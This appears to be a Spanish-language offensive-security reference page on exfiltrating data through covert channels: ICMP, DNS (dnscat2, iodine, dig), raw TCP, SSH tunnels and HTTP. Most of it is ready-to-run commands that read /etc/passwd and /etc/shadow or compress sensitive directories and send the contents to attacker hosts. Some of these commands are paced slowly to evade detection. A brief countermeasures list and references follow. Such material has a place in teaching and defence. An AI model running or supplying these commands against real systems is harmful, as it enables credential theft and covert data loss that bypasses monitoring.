---
title: Exfiltración por Canales Encubiertos
slug: canales-encubiertos
aliases: [Exfiltración por Canales Encubiertos]
fase: [Post-Explotación]
plataforma: Multi
dificultad: Avanzada
mitre: [T1048.001, T1048.003, T1071.004]
related: []
learning_refs: []
---

# Exfiltración por Canales Encubiertos

## Descripción
Los canales encubiertos (covert channels) son métodos de exfiltración que utilizan protocolos de red aparentemente legítimos para transportar datos de forma oculta. En lugar de transferir archivos directamente (lo cual puede ser detectado por firewalls y DLP), el atacante codifica los datos dentro de paquetes ICMP, consultas DNS, tráfico TCP con encoding especial, o túneles SSH. Estos canales son especialmente efectivos para evadir controles de seguridad perimetrales porque el tráfico se disfraza de comunicaciones normales de red. Los canales DNS son particularmente difíciles de bloquear ya que casi todas las redes permiten consultas DNS salientes.

## Herramientas
- **nping** (`--icmp --data-string`) — envío de datos dentro de paquetes ICMP
- **dnscat2** (https://github.com/iagox86/dnscat2) — túnel de comando y control sobre DNS
- **iodine** (https://github.com/yarrick/iodine) — túnel IP sobre DNS (encapsula tráfico IPv4 en consultas DNS)
- **dd** (`conv=ebcdic`) — encoding de datos para transmisión por TCP
- **ssh** (`-D`) — proxy SOCKS para exfiltración cifrada a través de túneles SSH

## Comandos / Ejemplos

### Exfiltración vía ICMP (ping)
```bash
# Enviar datos dentro de paquetes ICMP usando nping
# En el atacante: escuchar paquetes ICMP
sudo tcpdump -i eth0 icmp -w icmp_capture.pcap

# En la víctima: enviar datos línea por línea dentro de paquetes ICMP
sudo nping --icmp -c 1 10.10.14.5 --data-string "BOFfile.txt"
sudo nping --icmp -c 1 10.10.14.5 --data-string "admin:Password123"
sudo nping --icmp -c 1 10.10.14.5 --data-string "root:toor"
sudo nping --icmp -c 1 10.10.14.5 --data-string "EOF"

# Extraer datos de la captura
tshark -r icmp_capture.pcap -T fields -e data.text

# Alternativa con xxd y ping (sin nping)
cat /etc/passwd | xxd -p -c 16 | while read line; do
    ping -c 1 -p "$line" 10.10.14.5
done
```

### Exfiltración vía DNS
```bash
# Usando dnscat2 — servidor en el atacante
# Requiere un dominio controlado con NS record apuntando al atacante
ruby dnscat2.rb tunnel.attacker.com

# En la víctima — cliente dnscat2
./dnscat tunnel.attacker.com

# Exfiltración manual vía consultas DNS (sin herramientas especiales)
# Codificar datos en subdominios de consultas DNS
cat /etc/passwd | base64 | fold -w 60 | while read line; do
    dig "$line.exfil.attacker.com" @10.10.14.5
done

# En el atacante: capturar consultas DNS
sudo tcpdump -i eth0 port 53 -w dns_exfil.pcap
```

### Exfiltración vía iodine (IP sobre DNS)
```bash
# Servidor en la máquina del atacante (requiere dominio con NS configurado)
sudo iodined -c -f 10.0.0.1 tunnel.attacker.com

# Cliente en la víctima
sudo iodine -f tunnel.attacker.com

# Resultado: interfaz dns0 con IP 10.0.0.2 — túnel completo sobre DNS
# Ahora se puede usar SSH, SCP, o cualquier herramienta a través del túnel
scp -o "ProxyCommand=nc -X 5 -x 127.0.0.1:1080 %h %p" /etc/shadow attacker@10.0.0.1:/tmp/
```

### Exfiltración vía TCP con encoding
```bash
# Comprimir, codificar en base64 y convertir a EBCDIC para ofuscar
# En la víctima:
tar zcf - /path/to/sensitive/data | base64 | dd conv=ebcdic > /dev/tcp/10.10.14.5/8080

# En el atacante: recibir y decodificar
nc -nlvp 8080 | dd conv=ascii | base64 -d | tar xzf -
```

### Exfiltración vía SSH tunnel
```bash
# Crear proxy SOCKS5 a través de host comprometido con acceso a internet
ssh -D 1080 -N user@pivot-host

# Exfiltrar datos a través del proxy
curl --socks5 127.0.0.1:1080 -X POST -d @/tmp/sensitive_data.txt https://attacker-server.com/collect

# SCP a través de túnel SSH (cifrado end-to-end)
scp -o "ProxyCommand=ssh -W %h:%p user@pivot-host" /etc/shadow attacker@external-server:/tmp/
```

### Exfiltración vía HTTP/HTTPS
```bash
# Codificar archivo y enviarlo como parámetro HTTP
data=$(cat /etc/shadow | base64 | tr -d '\n')
curl -X POST -d "data=$data" https://attacker-server.com/collect

# Exfiltración lenta para evadir detección (una línea cada N segundos)
while IFS= read -r line; do
    curl -s "https://attacker-server.com/log?d=$(echo $line | base64)"
    sleep 5
done < /etc/shadow
```

## Contramedidas
- Implementar monitoreo de DNS con análisis de consultas anómalas: alto volumen, subdominios largos, tipos de registro inusuales (TXT, NULL)
- Limitar el tráfico DNS saliente para que solo pase a través de servidores DNS internos autorizados
- Inspeccionar paquetes ICMP en busca de payloads de datos (los pings legítimos tienen payloads estándar)
- Implementar DLP (Data Loss Prevention) para detectar datos sensibles en tráfico saliente
- Bloquear tráfico ICMP saliente desde servidores que no lo necesiten
- Monitorear conexiones SSH de larga duración con transferencia de datos inusual
- Implementar proxy SSL/TLS con inspección de tráfico para detectar exfiltración cifrada
- Usar herramientas de Network Detection and Response (NDR) entrenadas para detectar patrones de tunneling

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1048: Exfiltration Over Alternative Protocol. https://attack.mitre.org/techniques/T1048/
- MITRE Corporation. (2024). ATT&CK Technique T1071.004: Application Layer Protocol: DNS. https://attack.mitre.org/techniques/T1071/004/
- iagox86. (s.f.). *dnscat2* [Software]. GitHub. https://github.com/iagox86/dnscat2
- yarrick. (s.f.). *iodine* [Software]. GitHub. https://github.com/yarrick/iodine
- Sanders, C. (2017). *Network Security Through Data Analysis* (2nd ed.). O'Reilly Media.
- Cole, E. (2014). *Advanced Persistent Threat Hacking*. Syngress.
